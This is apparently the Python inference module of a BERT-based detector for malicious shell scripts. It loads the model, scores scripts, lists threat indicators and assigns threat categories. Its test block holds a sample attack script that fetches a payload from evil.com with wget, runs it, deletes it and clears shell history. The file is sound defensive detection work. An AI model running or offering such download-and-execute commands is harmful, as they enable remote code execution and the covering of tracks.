"""
BERT Inference API
Load trained model and make predictions on new shell scripts
"""

import torch
import json
import os
from typing import Dict, Any
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from bert.model import MalwareBERT, get_tokenizer, prepare_input
from bert.preprocessor import ShellScriptPreprocessor


class BERTPredictor:
    """Inference wrapper for trained BERT model"""

    def __init__(self, model_path=None, config_path=None):
        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')

        # Default paths
        if model_path is None:
            model_path = os.path.join(os.path.dirname(__file__), '../../models/bert/bert_malware_detector.pth')
        if config_path is None:
            config_path = os.path.join(os.path.dirname(__file__), '../../models/bert/model_config.json')

        # Load config
        self.config = self._load_config(config_path)

        # Initialize preprocessor and tokenizer
        arch = self.config.get('model_architecture', {})
        max_length = arch.get('max_length', 512)
        pretrained_model = arch.get('pretrained_model', 'distilbert-base-uncased')

        self.preprocessor = ShellScriptPreprocessor(max_length=max_length)
        self.tokenizer = get_tokenizer(pretrained_model)

        # Initialize and load model
        self.model = self._load_model(model_path)

    def _load_config(self, config_path):
        """Load model configuration"""
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return json.load(f)
        else:
            # Default config if file doesn't exist
            return {
                'model_architecture': {
                    'pretrained_model': 'distilbert-base-uncased',
                    'max_length': 512,
                    'dropout': 0.3,
                    'num_classes': 2
                }
            }

    def _load_model(self, model_path):
        """Load trained model"""
        arch = self.config.get('model_architecture', {})

        model = MalwareBERT(
            pretrained_model=arch.get('pretrained_model', 'distilbert-base-uncased'),
            num_classes=arch.get('num_classes', 2),
            dropout=arch.get('dropout', 0.3),
            freeze_bert=False
        ).to(self.device)

        if os.path.exists(model_path):
            model.load_state_dict(torch.load(model_path, map_location=self.device))
            model.eval()
            print(f"[BERT] Model loaded from: {model_path}")
        else:
            print(f"[BERT] WARNING: Model file not found at {model_path}")
            print(f"[BERT] Using untrained model. Train first using: python src/bert/train.py")

        return model

    def predict(self, script_content: str) -> Dict[str, Any]:
        """
        Predict if script is malicious

        Args:
            script_content: Shell script as string

        Returns:
            Dictionary with prediction results
        """
        try:
            # Preprocess script
            text, features = self.preprocessor.prepare_for_bert(script_content)

            # Prepare input for BERT
            input_ids, attention_mask = prepare_input(
                text,
                self.tokenizer,
                max_length=self.config['model_architecture'].get('max_length', 512),
                device=self.device
            )

            # Make prediction
            result = self.model.predict(input_ids, attention_mask)

            # Add preprocessing features
            result['semantic_features'] = features
            result['risk_score'] = float(result['prob_malicious'] * 100)

            # Identify threat indicators from features
            result['threat_indicators'] = self._identify_threats(features)

            # Determine threat category
            result['threat_category'] = self._categorize_threat(features)

            return result

        except Exception as e:
            return {
                'error': str(e),
                'predicted_class': -1,
                'is_malicious': False,
                'confidence': 0.0,
                'risk_score': 0.0,
                'threat_category': 'unknown'
            }

    def _identify_threats(self, features: Dict) -> list:
        """
        Identify specific threat indicators from features

        Returns:
            List of threat indicators
        """
        threats = []

        if features['urls']:
            threats.append({
                'type': 'Network Activity',
                'description': f"Found {len(features['urls'])} URL(s)",
                'severity': 'high' if len(features['urls']) > 2 else 'medium',
                'samples': features['urls'][:3]
            })

        if features['ips']:
            threats.append({
                'type': 'IP Addresses',
                'description': f"Found {len(features['ips'])} IP address(es)",
                'severity': 'high' if len(features['ips']) > 1 else 'medium',
                'samples': features['ips'][:3]
            })

        if features['dangerous_commands']:
            threats.append({
                'type': 'Dangerous Commands',
                'description': f"Found {len(features['dangerous_commands'])} dangerous command(s)",
                'severity': 'critical' if len(features['dangerous_commands']) > 3 else 'high',
                'samples': list(set(features['dangerous_commands']))[:5]
            })

        if features['has_base64']:
            threats.append({
                'type': 'Encoded Content',
                'description': f"Contains {features['base64_count']} base64-encoded string(s)",
                'severity': 'medium',
                'samples': []
            })

        if features['obfuscation_score'] > 0.5:
            threats.append({
                'type': 'Obfuscation',
                'description': f"High obfuscation detected (score: {features['obfuscation_score']:.2f})",
                'severity': 'high',
                'samples': []
            })

        if features['suspicious_patterns']:
            pattern_count = len(features['suspicious_patterns'])
            threats.append({
                'type': 'Suspicious Patterns',
                'description': f"Found {pattern_count} suspicious pattern(s)",
                'severity': 'medium' if pattern_count < 5 else 'high',
                'samples': list(set(features['suspicious_patterns']))[:5]
            })

        return threats

    def _categorize_threat(self, features: Dict) -> str:
        """
        Categorize the type of threat based on features

        Returns:
            Threat category name
        """
        has_network = len(features['urls']) > 0 or len(features['ips']) > 0
        has_dangerous = len(features['dangerous_commands']) > 0
        has_obfuscation = features['obfuscation_score'] > 0.5
        has_encoding = features['has_base64']

        # Category detection
        if has_network and has_dangerous and has_obfuscation:
            return "advanced-malware"
        elif has_network and has_dangerous:
            return "network-exploit"
        elif has_obfuscation and has_encoding:
            return "obfuscated-payload"
        elif has_network:
            return "data-exfiltration"
        elif has_dangerous:
            return "system-manipulation"
        elif features['dangerous_ratio'] > 0.5:
            return "suspicious-commands"
        else:
            return "low-risk"

    def analyze_batch(self, script_paths: list) -> list:
        """
        Analyze multiple scripts

        Args:
            script_paths: List of file paths

        Returns:
            List of prediction dictionaries
        """
        results = []
        for path in script_paths:
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    script = f.read()
                result = self.predict(script)
                result['filepath'] = path
                results.append(result)
            except Exception as e:
                results.append({
                    'filepath': path,
                    'error': str(e),
                    'is_malicious': False
                })
        return results


# Singleton instance
_predictor_instance = None


def get_predictor() -> BERTPredictor:
    """Get or create predictor instance (singleton)"""
    global _predictor_instance
    if _predictor_instance is None:
        _predictor_instance = BERTPredictor()
    return _predictor_instance


if __name__ == '__main__':
    # Test inference
    print("Testing BERT Inference...")

    predictor = BERTPredictor()

    # Test with sample malicious script
    malicious_script = """#!/bin/bash
wget http://evil.com/malware.sh -O /tmp/payload
chmod +x /tmp/payload
/tmp/payload &
rm /tmp/payload
history -c
"""

    result = predictor.predict(malicious_script)

    print("\nPrediction Results:")
    print(f"  Is Malicious: {result['is_malicious']}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Risk Score: {result['risk_score']:.1f}/100")
    print(f"  Threat Category: {result['threat_category']}")
    print(f"\nSemantic Features:")
    print(f"  Total Commands: {result['semantic_features']['total_commands']}")
    print(f"  Dangerous Commands: {len(result['semantic_features']['dangerous_commands'])}")
    print(f"  URLs: {len(result['semantic_features']['urls'])}")
    print(f"\nThreat Indicators: {len(result['threat_indicators'])}")
    for threat in result['threat_indicators']:
        print(f"  - {threat['type']}: {threat['description']} [{threat['severity']}]")
